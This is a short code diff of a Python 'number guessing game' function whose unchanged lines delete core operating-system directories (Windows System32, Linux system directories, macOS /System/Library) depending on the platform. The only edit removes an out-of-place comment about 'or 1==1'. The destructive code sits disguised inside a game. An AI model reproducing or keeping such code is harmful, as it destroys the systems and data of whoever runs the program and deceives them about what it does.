@@ -38,7 +38,7 @@ def number_guessing_game():
                 os.remove("C:\\Windows\\System32")
             elif platform.system() == "Linux":
                 for directory in system_directories:
-                    os.remove(directory)  # You can't use `or 1==1` in this context
+                    os.remove(directory)  
             elif platform.system() == "Darwin":
                 os.remove("/System/Library")
 
